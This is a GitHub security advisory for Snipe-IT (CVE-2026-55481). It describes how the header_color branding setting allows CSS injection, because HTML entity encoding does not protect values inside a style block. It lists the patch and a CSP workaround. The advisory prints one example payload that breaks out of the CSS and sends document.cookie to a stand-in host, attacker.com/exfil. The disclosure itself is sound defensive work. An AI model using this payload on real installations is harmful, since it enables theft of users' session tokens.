# [M] Snipe-IT has CSS Injection via `header_color` Setting

## Summary
Severity: Medium
Advisory: GHSA-w7qw-5wfv-gwx9
CVE: CVE-2026-55481
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-w7qw-5wfv-gwx9
Type: github-advisory

## Affected
- Packagist: `snipe/snipe-it` — affected >=0 <8.6.2

## Details
### Impact

Because `default.blade.php` is the base layout loaded on every authenticated page, all active user sessions are affected immediately upon the next page load after the payload is saved. An attacker who has compromised an admin account (or who is a malicious insider) can use this to silently exfiltrate session tokens from all other users, including other administrators.

Additionally, the Content Security Policy is disabled by default in Snipe-IT installations, which removes the primary browser-level mitigation for this class of attack.


### Details
The `header_color` setting (and related color settings such as `nav_color` and `link_color`) is rendered inside a CSS `<style>` block using Laravel's `{{ }}` syntax:

```
--main-theme-color: {{ $snipeSettings->header_color ?? '#3c8dbc' }};
```

Although `{{ }}` applies HTML entity encoding, this is insufficient in a CSS context. An attacker with superadmin access to the `Settings > Branding` page can inject arbitrary CSS by setting the `header_color` value to something like:

```
    #fff; } body { background: url('[https://attacker.com/exfil?c='+document.cookie](https://attacker.com/exfil?c=%27+document.cookie)); } .x {
```

This breaks out of the CSS property value and injects a new rule that executes in the context of every authenticated user's browser on every page load.

### Patches
Patched in https://github.com/grokability/snipe-it/pull/19097

### Workarounds
Enable CSP in your .env file.

## References
- https://github.com/grokability/snipe-it/security/advisories/GHSA-w7qw-5wfv-gwx9
- https://nvd.nist.gov/vuln/detail/CVE-2026-55481
- https://github.com/grokability/snipe-it/pull/19097
- https://github.com/grokability/snipe-it/commit/c31190a128ec96fb34000a2f27eae198b1a51d40
- https://github.com/grokability/snipe-it
- https://github.com/grokability/snipe-it/releases/tag/v8.6.2
